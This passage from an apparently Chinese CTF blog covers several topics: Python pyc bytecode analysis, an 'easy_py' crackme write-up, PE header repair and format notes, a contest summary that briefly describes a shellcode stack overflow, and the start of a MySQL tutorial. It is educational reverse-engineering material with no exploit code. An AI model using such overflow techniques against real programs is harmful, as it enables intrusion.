STORE_NAME               <span class="number">2</span> (i)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>          <span class="number">25</span> LOAD_NAME                <span class="number">3</span> (chr)</span><br><span class="line">           <span class="number">28</span> LOAD_NAME                <span class="number">4</span> (ord)</span><br><span class="line">           <span class="number">31</span> LOAD_NAME                <span class="number">0</span> (s)</span><br><span class="line">           <span class="number">34</span> LOAD_NAME                <span class="number">2</span> (i)</span><br><span class="line">           <span class="number">37</span> BINARY_SUBSCR</span><br><span class="line">           <span class="comment"># 31到37即为返回s[i]</span></span><br><span class="line">           <span class="number">38</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="comment"># 调用最近load的函数ord,然后销毁</span></span><br><span class="line">           <span class="number">41</span> LOAD_NAME                <span class="number">2</span> (i)</span><br><span class="line">           <span class="number">44</span> BINARY_ADD</span><br><span class="line">           <span class="number">45</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="comment"># 调用最近的load的函数chr</span></span><br><span class="line">           <span class="number">48</span> PRINT_ITEM</span><br><span class="line">           <span class="number">49</span> PRINT_NEWLINE</span><br><span class="line">           <span class="number">50</span> JUMP_ABSOLUTE           <span class="number">19</span></span><br><span class="line">      &gt;&gt;   <span class="number">53</span> POP_BLOCK</span><br><span class="line">      &gt;&gt;   <span class="number">54</span> LOAD_CONST               <span class="number">2</span> (<span class="literal">None</span>)</span><br><span class="line">           <span class="number">57</span> RETURN_VALUE</span><br></pre></td></tr></table></figure>

<ul>
<li>这样结合着上面两个就能理解出了opcode运行的一些过程,不过load函数部分还不是很懂,所以还请师傅们多多指教</li>
<li>插一个丧病的小实验,我把print后面的参数改成了chr(ord(chr(ord(s[i]) + i))),然后opcode变成了下面的样子</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>           <span class="number">0</span> LOAD_CONST               <span class="number">0</span> (<span class="string">'helloworld!'</span>)</span><br><span class="line">            <span class="number">3</span> STORE_NAME               <span class="number">0</span> (s)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>           <span class="number">6</span> SETUP_LOOP              <span class="number">57</span> (to <span class="number">66</span>)</span><br><span class="line">            <span class="number">9</span> LOAD_NAME                <span class="number">1</span> (range)</span><br><span class="line">           <span class="number">12</span> LOAD_CONST               <span class="number">1</span> (<span class="number">11</span>)</span><br><span class="line">           <span class="number">15</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="number">18</span> GET_ITER</span><br><span class="line">      &gt;&gt;   <span class="number">19</span> FOR_ITER                <span class="number">43</span> (to <span class="number">65</span>)</span><br><span class="line">           <span class="number">22</span> STORE_NAME               <span class="number">2</span> (i)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>          <span class="number">25</span> LOAD_NAME                <span class="number">3</span> (chr)</span><br><span class="line">           <span class="number">28</span> LOAD_NAME                <span class="number">4</span> (ord)</span><br><span class="line">           <span class="number">31</span> LOAD_NAME                <span class="number">3</span> (chr)</span><br><span class="line">           <span class="number">34</span> LOAD_NAME                <span class="number">4</span> (ord)</span><br><span class="line">           <span class="number">37</span> LOAD_NAME                <span class="number">0</span> (s)</span><br><span class="line">           <span class="number">40</span> LOAD_NAME                <span class="number">2</span> (i)</span><br><span class="line">           <span class="number">43</span> BINARY_SUBSCR</span><br><span class="line">           <span class="number">44</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="number">47</span> LOAD_NAME                <span class="number">2</span> (i)</span><br><span class="line">           <span class="number">50</span> BINARY_ADD</span><br><span class="line">           <span class="number">51</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="number">54</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="number">57</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="number">60</span> PRINT_ITEM</span><br><span class="line">           <span class="number">61</span> PRINT_NEWLINE</span><br><span class="line">           <span class="number">62</span> JUMP_ABSOLUTE           <span class="number">19</span></span><br><span class="line">      &gt;&gt;   <span class="number">65</span> POP_BLOCK</span><br><span class="line">      &gt;&gt;   <span class="number">66</span> LOAD_CONST               <span class="number">2</span> (<span class="literal">None</span>)</span><br><span class="line">           <span class="number">69</span> RETURN_VALUE</span><br></pre></td></tr></table></figure>

<ul>
<li>可以注意下,再循环的内部,的确和我理解的一样,他按照原py代码的顺序从外到内加载了chr,ord,chr,ord,并且一直都是CALL_FUNCTION            1,这种我看来是类似于调用后出栈再次调用栈顶函数的顺序操作…</li>
<li>然后这样导致了pyc文件中栈空间从5变成了7,正好是多出来的两个chr ord.</li>
</ul>
<h1 id="2018东华杯-easy-py"><a href="#2018东华杯-easy-py" class="headerlink" title="2018东华杯-easy_py"></a>2018东华杯-easy_py</h1><ul>
<li>该题是一个比较基础的pyc解析的题目,然后反编译失败了,只好手动解析</li>
<li>提取出opcode之后,opcode的头部中出现了一些奇怪的东西”LOAD_CONST      13091 (13091)”,居然load了偏移为13091的常量,但是之前有跳转指令,但是也就是这句话导致该pyc无法被转成py文件,这里直接清除掉前9个字节的花指令,修改掉’s’类型的opcode的长度0xb2为0xb2-9,这时反编译就能得到如下结果</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cmp = [</span><br><span class="line"> f]</span><br><span class="line">flag = raw_input()</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    i = ~ord(i) &amp; <span class="number">102</span> | ord(i) &amp; <span class="number">-103</span></span><br><span class="line">    <span class="keyword">if</span> i == cmp[m]:</span><br><span class="line">        m = -(-m + <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'wrong'</span></span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'right'</span></span><br></pre></td></tr></table></figure>

<ul>
<li>化简m = -(-m + -1)为m += 1,i = <del>ord(i) &amp; ~(-103) | ord(i) &amp; -103,即为a = ~a&amp;</del>b | a&amp;b,即a ^= b ,a ~= a</li>
<li>最后化简为chr((~(s[i]^(-103)))&amp;0xff),写解密脚本得到flag{happy_xoR}</li>
<li>或者采用opcode来进行逆向,pyc文件解析后得到如下结果</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">magic: 168686339</span><br><span class="line">mtime: 1540275390</span><br><span class="line">code obj: code(</span><br><span class="line">	argcount = 0</span><br><span class="line">	nlocals = 0</span><br><span class="line">	stacksize = 15</span><br><span class="line">	flags = 64</span><br><span class="line">	code = 0x640000640100640200640300640400640500640200640600640600640700640800640900640a00640b00640c00670f005a00006501008300005a02006400005a0300785b00650200445d53005a04006505006504008301000f640d004065050065040083010064120040425a0400650400650000650300196b02007290006503000b640e00170b5a0300714900714900640f0047486506008300000171490057641000474864110053</span><br><span class="line">	consts = (0, 10, 7, 1, 29, 14, 22, 31, 57, 30, 9, 52, 27, 102, 4294967295, &apos;wrong&apos;, &apos;right&apos;, None, 4294967193)</span><br><span class="line">	names = (&apos;cmp&apos;, &apos;raw_input&apos;, &apos;flag&apos;, &apos;m&apos;, &apos;i&apos;, &apos;ord&apos;, &apos;exit&apos;)</span><br><span class="line">	varnames = ()</span><br><span class="line">	freevars = ()</span><br><span class="line">	cellvars = ()</span><br><span class="line">	filename = easy_py.py</span><br><span class="line">	name = &lt;module&gt;</span><br><span class="line">	firstlineno = 1</span><br><span class="line">	lnotab = 3</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>反编译code后得到下面的opcode</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">      <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)   <span class="comment"># 加载 0</span></span><br><span class="line">      <span class="number">3</span> LOAD_CONST          <span class="number">1</span> (<span class="number">1</span>)   <span class="comment"># 加载 10</span></span><br><span class="line">      <span class="number">6</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)   <span class="comment"># 加载 7</span></span><br><span class="line">      <span class="number">9</span> LOAD_CONST          <span class="number">3</span> (<span class="number">3</span>)   <span class="comment"># 加载 1</span></span><br><span class="line">     <span class="number">12</span> LOAD_CONST          <span class="number">4</span> (<span class="number">4</span>)   <span class="comment"># 加载 29</span></span><br><span class="line">     <span class="number">15</span> LOAD_CONST          <span class="number">5</span> (<span class="number">5</span>)   <span class="comment"># 加载 14</span></span><br><span class="line">     <span class="number">18</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)   <span class="comment"># 加载 7</span></span><br><span class="line">     <span class="number">21</span> LOAD_CONST          <span class="number">6</span> (<span class="number">6</span>)   <span class="comment"># 加载 22</span></span><br><span class="line">     <span class="number">24</span> LOAD_CONST          <span class="number">6</span> (<span class="number">6</span>)   <span class="comment"># 加载 22</span></span><br><span class="line">     <span class="number">27</span> LOAD_CONST          <span class="number">7</span> (<span class="number">7</span>)   <span class="comment"># 加载 31</span></span><br><span class="line">     <span class="number">30</span> LOAD_CONST          <span class="number">8</span> (<span class="number">8</span>)   <span class="comment"># 加载 57</span></span><br><span class="line">     <span class="number">33</span> LOAD_CONST          <span class="number">9</span> (<span class="number">9</span>)   <span class="comment"># 加载 30</span></span><br><span class="line">     <span class="number">36</span> LOAD_CONST         <span class="number">10</span> (<span class="number">10</span>)   <span class="comment"># 加载 9</span></span><br><span class="line">     <span class="number">39</span> LOAD_CONST         <span class="number">11</span> (<span class="number">11</span>)   <span class="comment"># 加载 52</span></span><br><span class="line">     <span class="number">42</span> LOAD_CONST         <span class="number">12</span> (<span class="number">12</span>)   <span class="comment"># 加载 27</span></span><br><span class="line">     <span class="number">45</span> BUILD_LIST         <span class="number">15</span>        <span class="comment"># 组成一个list</span></span><br><span class="line">     <span class="number">48</span> STORE_NAME          <span class="number">0</span> (<span class="number">0</span>)    <span class="comment"># 入栈</span></span><br><span class="line">     <span class="number">51</span> LOAD_NAME           <span class="number">1</span> (<span class="number">1</span>)    <span class="comment"># 加载raw_input</span></span><br><span class="line">     <span class="number">54</span> CALL_FUNCTION       <span class="number">0</span>        <span class="comment"># 调用</span></span><br><span class="line">     <span class="number">57</span> STORE_NAME          <span class="number">2</span> (<span class="number">2</span>)    <span class="comment"># 输入的字符串存储在[2]</span></span><br><span class="line">     <span class="number">60</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">     <span class="number">63</span> STORE_NAME          <span class="number">3</span> (<span class="number">3</span>)</span><br><span class="line">     <span class="number">66</span> SETUP_LOOP         <span class="number">91</span> (to <span class="number">160</span>)</span><br><span class="line">     <span class="number">69</span> LOAD_NAME           <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">72</span> GET_ITER</span><br><span class="line">&gt;&gt;   <span class="number">73</span> FOR_ITER           <span class="number">83</span> (to <span class="number">159</span>)</span><br><span class="line">     <span class="number">76</span> STORE_NAME          <span class="number">4</span> (<span class="number">4</span>)</span><br><span class="line">     <span class="number">79</span> LOAD_NAME           <span class="number">5</span> (<span class="number">5</span>)   <span class="comment"># ord</span></span><br><span class="line">     <span class="number">82</span> LOAD_NAME           <span class="number">4</span> (<span class="number">4</span>)   <span class="comment"># i</span></span><br><span class="line">     <span class="number">85</span> CALL_FUNCTION       <span class="number">1</span></span><br><span class="line">     <span class="number">88</span> UNARY_INVERT                <span class="comment"># ~</span></span><br><span class="line">     <span class="number">89</span> LOAD_CONST         <span class="number">13</span> (<span class="number">13</span>)  <span class="comment"># 102</span></span><br><span class="line">     <span class="number">92</span> BINARY_AND                  <span class="comment"># 102 &amp; ~ord(i)</span></span><br><span class="line">     <span class="number">93</span> LOAD_NAME           <span class="number">5</span> (<span class="number">5</span>)   <span class="comment"># ord</span></span><br><span class="line">     <span class="number">96</span> LOAD_NAME           <span class="number">4</span> (<span class="number">4</span>)   <span class="comment"># i</span></span><br><span class="line">     <span class="number">99</span> CALL_FUNCTION       <span class="number">1</span>       <span class="comment"># ord(i)</span></span><br><span class="line">    <span class="number">102</span> LOAD_CONST         <span class="number">18</span> (<span class="number">18</span>)  <span class="comment"># 4294967193 即 -103</span></span><br><span class="line">    <span class="number">105</span> BINARY_AND                  <span class="comment"># ord(i) &amp; -103</span></span><br><span class="line">    <span class="number">106</span> BINARY_OR                   <span class="comment"># 102 &amp; ~ord(i) | ord(i) &amp; -103</span></span><br><span class="line">    <span class="number">107</span> STORE_NAME          <span class="number">4</span> (<span class="number">4</span>)   <span class="comment"># </span></span><br><span class="line">    <span class="number">110</span> LOAD_NAME           <span class="number">4</span> (<span class="number">4</span>)</span><br><span class="line">    <span class="number">113</span> LOAD_NAME           <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">    <span class="number">116</span> LOAD_NAME           <span class="number">3</span> (<span class="number">3</span>)</span><br><span class="line">    <span class="number">119</span> BINARY_SUBSCR</span><br><span class="line">    <span class="number">120</span> COMPARE_OP          <span class="number">2</span> (==) <span class="comment"># 是否相等</span></span><br><span class="line">    <span class="number">123</span> POP_JUMP_IF_FALSE   <span class="number">144</span></span><br><span class="line">    <span class="number">126</span> LOAD_NAME           <span class="number">3</span> (<span class="number">3</span>)</span><br><span class="line">    <span class="number">129</span> UNARY_NEGATIVE</span><br><span class="line">    <span class="number">130</span> LOAD_CONST         <span class="number">14</span> (<span class="number">14</span>)</span><br><span class="line">    <span class="number">133</span> BINARY_ADD</span><br><span class="line">    <span class="number">134</span> UNARY_NEGATIVE</span><br><span class="line">    <span class="number">135</span> STORE_NAME          <span class="number">3</span> (<span class="number">3</span>)</span><br><span class="line">    <span class="number">138</span> JUMP_ABSOLUTE      <span class="number">73</span></span><br><span class="line">    <span class="number">141</span> JUMP_ABSOLUTE      <span class="number">73</span></span><br><span class="line">&gt;&gt;  <span class="number">144</span> LOAD_CONST         <span class="number">15</span> (<span class="number">15</span>) <span class="comment"># wrong</span></span><br><span class="line">    <span class="number">147</span> PRINT_ITEM</span><br><span class="line">    <span class="number">148</span> PRINT_NEWLINE</span><br><span class="line">    <span class="number">149</span> LOAD_NAME           <span class="number">6</span> (<span class="number">6</span>)</span><br><span class="line">    <span class="number">152</span> CALL_FUNCTION       <span class="number">0</span>     <span class="comment"># exit</span></span><br><span class="line">    <span class="number">155</span> POP_TOP</span><br><span class="line">    <span class="number">156</span> JUMP_ABSOLUTE      <span class="number">73</span></span><br><span class="line">&gt;&gt;  <span class="number">159</span> POP_BLOCK</span><br><span class="line">&gt;&gt;  <span class="number">160</span> LOAD_CONST         <span class="number">16</span> (<span class="number">16</span>)<span class="comment"># right</span></span><br><span class="line">    <span class="number">163</span> PRINT_ITEM</span><br><span class="line">    <span class="number">164</span> PRINT_NEWLINE</span><br><span class="line">    <span class="number">165</span> LOAD_CONST         <span class="number">17</span> (<span class="number">17</span>) </span><br><span class="line">    <span class="number">168</span> RETURN_VALUE              <span class="comment"># return NONE</span></span><br></pre></td></tr></table></figure>

<ul>
<li>由此也可以整理出算法 102 &amp; ~ord(i) | ord(i) &amp; -103</li>
</ul>
<h1 id="多函数的pyc文件结构"><a href="#多函数的pyc文件结构" class="headerlink" title="多函数的pyc文件结构"></a>多函数的pyc文件结构</h1><ul>
<li>与单文件的相似,夜影师傅博客里说实际上是一个嵌套的结构,这里编译一个pyc看一下,这里我把chr()写入了一个名为ch的函数,再来看一下pyc文件的16进制变成了什么</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00000000: 03f3 0d0a f9e7 e35b 6300 0000 0000 0000  .......[c.......</span><br><span class="line">00000010: 0007 0000 0040 0000 0073 4f00 0000 6400  .....@...sO...d.</span><br><span class="line">00000020: 005a 0000 6401 0084 0000 5a01 0078 3900  .Z..d.....Z..x9.</span><br><span class="line">00000030: 6502 0064 0200 8301 0044 5d2b 005a 0300  e..d.....D]+.Z..</span><br><span class="line">00000040: 6501 0065 0400 6501 0065 0400 6500 0065  e..e..e..e..e..e</span><br><span class="line">00000050: 0300 1983 0100 6503 0017 8301 0083 0100  ......e.........</span><br><span class="line">00000060: 8301 0047 4871 1c00 5764 0300 5328 0400  ...GHq..Wd..S(..</span><br><span class="line">00000070: 0000 730b 0000 0068 656c 6c6f 776f 726c  ..s....helloworl</span><br><span class="line">00000080: 6421 6301 0000 0001 0000 0002 0000 0043  d!c............C</span><br><span class="line">00000090: 0000 0073 0a00 0000 7400 007c 0000 8301  ...s....t..|....</span><br><span class="line">000000a0: 0053 2801 0000 004e 2801 0000 0074 0300  .S(....N(....t..</span><br><span class="line">000000b0: 0000 6368 7228 0100 0000 7401 0000 0061  ..chr(....t....a</span><br><span class="line">000000c0: 2800 0000 0028 0000 0000 7304 0000 0031  (....(....s....1</span><br><span class="line">000000d0: 2e70 7974 0200 0000 6368 0300 0000 7302  .pyt....ch....s.</span><br><span class="line">000000e0: 0000 0000 0169 0b00 0000 4e28 0500 0000  .....i....N(....</span><br><span class="line">000000f0: 7401 0000 0073 5202 0000 0074 0500 0000  t....sR....t....</span><br><span class="line">00000100: 7261 6e67 6574 0100 0000 6974 0300 0000  ranget....it....</span><br><span class="line">00000110: 6f72 6428 0000 0000 2800 0000 0028 0000  ord(....(....(..</span><br><span class="line">00000120: 0000 7304 0000 0031 2e70 7974 0800 0000  ..s....1.pyt....</span><br><span class="line">00000130: 3c6d 6f64 756c 653e 0100 0000 7306 0000  &lt;module&gt;....s...</span><br><span class="line">00000140: 0006 0209 0213 01                        .......</span><br></pre></td></tr></table></figure>

<ul>
<li>经过对比可以发现const中多了一个PyCodeObject块,可以看出来里面存在一个参数,一个变量,2个栈空间,以及flag位,随后是10字节的opcode,后续跟着的就是该块的const常量以及一些文件相关信息,</li>
<li>在这个pco块后,又是最初最大的块的常量以及name等变量,可以看出来pyc的多函数的嵌套关系</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/python_pyc/" data-id="cjyn83qfu003cicthe48x6img" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PE文件头的利用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/PE文件头的利用/" class="article-date">
  <time datetime="2019-07-28T17:11:01.737Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/PE文件头的利用/">ichunqiu-NoExec-200pt</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="初探NoExec"><a href="#初探NoExec" class="headerlink" title="初探NoExec"></a>初探NoExec</h1><ul>
<li>看到了题目名,感觉会有一点弯子,010查了一波..随便扫了一眼感觉没啥问题,IDA启动!</li>
<li>GG了,IDA不能识别程序,跑一下模板好了</li>
<li>模板跑完后发现好像只有程序前半段被识别出来,查一波文件结构顺便复习下</li>
<li>对照后发现,DOS头的e_lfanew被改动过了,观察NT头的位置可以复现,e_lfanew应该是10010000(小端序)</li>
<li>NT头仿佛也出现了问题,e_magic居然被改成了PEHA,改回来,Machine改成0x014c的小端形式(I386)</li>
<li>此时文件已经被电脑识别出来,原来是个MFC</li>
<li>双击运行….GG,没跑起来,IDA启动,继续分析,不过这个时候,IDA可以成功的分析出程序的所有结构了.</li>
<li>修改下代码段可执行就就好了啊,现在可以跑了</li>
<li>分析文件,发现貌似是DES,先去学一波密码学,几个月后再回来补.</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/PE文件头的利用/" data-id="cjyn83qe2000bicth67xc65ah" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PE文件头" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/PE文件头/" class="article-date">
  <time datetime="2019-07-28T17:11:01.733Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/PE文件头/">PE文件格式</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>PE文件格式其实就是PE头中的结构体.用010Editor可以很好地解析文件头.<br>具体分为DOS头,DOS存根,NT头,字区头 .text .data .rsrc,然后是NULL padding</p>
<h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h2><p>PE文件从磁盘到内存映射的内容.PE文件加载到内存时,每个节区都要完成内存地址于文件偏移之间的映射</p>
<ul>
<li>查找RVA所在节区</li>
<li>使用简单的公式计算文件偏移RAW</li>
</ul>
<h2 id="IAT-import-address-table-导入地址表"><a href="#IAT-import-address-table-导入地址表" class="headerlink" title="IAT(import address table,导入地址表)"></a>IAT(import address table,导入地址表)</h2><p>DLL:(Dynamic Link Libray,动态链接库)<br><br>为了提高内存运用效率,引入了DLL的概念.</p>
<ul>
<li>多进程共享</li>
<li>更新库时只需更新各自的DLL文件</li>
</ul>
<p>加载DLL库的方法有两种,一种是”显式链接”,即程序使用DLL时加载,使用后释放内存,一种是”隐式链接”,程序开始时加载DLL,程序全部结束时释放内存.在程序运行时,调用API函数时,会先CALL一个地址,这个地址的值即为 .text节区的内存区域,这个地址的值即为.dll的地址.<br><br>那么为什么不直接call .dll对应的地址呢,因为平台的差异,所以.dll版本不同,对应函数的位置也不相同,为了确保所有环境下都能用到.dll,所以记录了实际地址位置,并且只call 实际地址,执行文件时,PE装载器会直接将函数的地址写到实际地址的位置.<br></p>
<blockquote>
<p>imagebase:进程的虚拟内存范围0-FFFFFFFF,PE文件被加载到如此大的内存时,ImageBase指出文件优先装载地址,EXE,ALL装载到0-7FFFFFFF,SYS 80000000-FFFFFFFF,DLL文件的ImageBase值为10000000.</p>
</blockquote>
<p>由于DLL重定位的存在,一个程序使用a.dll和b.dll时,由于a.dll已经占用了10000000处,所以b.dll会被PE装载到其他空白内存空间.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/PE文件头/" data-id="cjyn83qe00007icthw8pg5wlv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-NUST" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/NUST/" class="article-date">
  <time datetime="2019-07-28T17:11:01.728Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/NUST/">南理校赛二进制wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="NUST面向大一的比赛"><a href="#NUST面向大一的比赛" class="headerlink" title="NUST面向大一的比赛"></a>NUST面向大一的比赛</h1><p>总体来说不是很难,大师傅们难度控制的也很好,有难有易.</p>
<ul>
<li>大体上考察了逆向的基础,还有别的知识,例如base编码,阅读简单算法,混淆与patch.</li>
<li>pwn的话,一个写入shellcode的栈题,还有一个babyheap…(GG)</li>
</ul>
<h1 id="re200"><a href="#re200" class="headerlink" title="re200"></a>re200</h1><p>魔改了base64,写出对应算法和替换表即可.</p>
<h1 id="re270"><a href="#re270" class="headerlink" title="re270"></a>re270</h1><p>很简单的maze,但是要找好方向,还有多解问题,但是只有一组解才能打印出正确的答案,当时被w和s坑的不浅…</p>
<h1 id="re320"><a href="#re320" class="headerlink" title="re320"></a>re320</h1><p>一个exe和dll,全是C#写的,其中exe被加了加密壳.反编译无果,考虑dll是否有猫腻,果然有明显的数据痕迹,patch数据即可.</p>
<h1 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h1><p>get了一个字符串,没有canary,栈可执行,但是栈的长度只有22 ???,哪有那么短的shellcode,后发现,还有吧shellcode写越界的操作,直接伪造新的函数帧栈,覆盖返回地址,执行shellcode.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/NUST/" data-id="cjyn83qdx0004icthrtml6yp9" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-MYSQL" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/MYSQL/" class="article-date">
  <time datetime="2019-07-28T17:11:01.724Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/MYSQL/">网站开发入门-MYSQL数据库的基础使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p>直接进入主题<br>MYSQL数据库的结构大概就是 库–&gt;表单–&gt;行列等等,那么管理使用数据库,就需要一门结构化查询语言(Structured Query Language)简称SQL.<br>从0开始,若想使用数据库,首先要建立一个库,于是有了</p>
<blockquote>
<p>CREATE DATABASE test<br> DROP DATABASE test</p>
</blockquote>
<p>然后是新建表单.表(Table)由行集合构成,一行是列的序列(集合)，每列与行对应一个数据项.</p>
<blockquote>
<p>CREATE TABLE 表名称<br>(<br>    列名称1 数据类型,<br>    列名称2 数据类型,<br>    列名称3 数据类型,<br>    ….<br>)</p>
</blockquote>
<p>sql里的数据类型,和一般语言(PHP C python)表示有些不同.详见下图.<br><img src="/image/sql.jpg" alt><br>在PHP中,调用sql数据库的方法大概如下:</p>
